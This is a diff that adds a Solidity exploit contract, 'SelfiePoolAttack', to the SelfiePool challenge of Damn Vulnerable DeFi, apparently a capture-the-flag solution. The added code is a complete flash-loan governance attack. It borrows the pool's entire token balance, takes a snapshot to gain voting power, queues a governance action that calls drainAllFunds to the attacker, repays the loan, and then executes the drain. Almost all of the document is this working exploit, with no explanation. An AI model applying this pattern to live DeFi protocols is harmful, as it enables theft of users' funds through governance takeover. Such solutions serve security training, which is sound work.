@@ -6,6 +6,8 @@ import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "./SimpleGovernance.sol";
 
+import "../DamnValuableTokenSnapshot.sol";
+
 /**
  * @title SelfiePool
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
@@ -54,5 +56,44 @@ contract SelfiePool is ReentrancyGuard {
         token.transfer(receiver, amount);
         
         emit FundsDrained(receiver, amount);
+    }
+}
+
+contract SelfiePoolAttack {
+    address private _owner;
+    address private _pool;
+    address private _governance;
+    address private _token;
+
+    uint private _attackActionId;
+
+    constructor(
+        address pool,
+        address governance,
+        address token
+    ) {
+        _owner = msg.sender;
+        _pool = pool;
+        _governance = governance;
+        _token = token;
+    }
+
+    function attack() external {
+        SelfiePool(_pool).flashLoan(DamnValuableTokenSnapshot(_token).balanceOf(_pool));
+    }
+
+    function receiveTokens(address tokenAddress, uint256 amount) external {
+        DamnValuableTokenSnapshot(_token).snapshot();
+
+        _attackActionId = SimpleGovernance(_governance).queueAction(
+            _pool,
+            abi.encodeWithSignature("drainAllFunds(address)", _owner),
+            0
+        );
+        require(DamnValuableTokenSnapshot(_token).transfer(_pool, amount), "Payback failed");
+    }
+
+    function executeDrain() external {
+        SimpleGovernance(_governance).executeAction(_attackActionId);
     }
 }
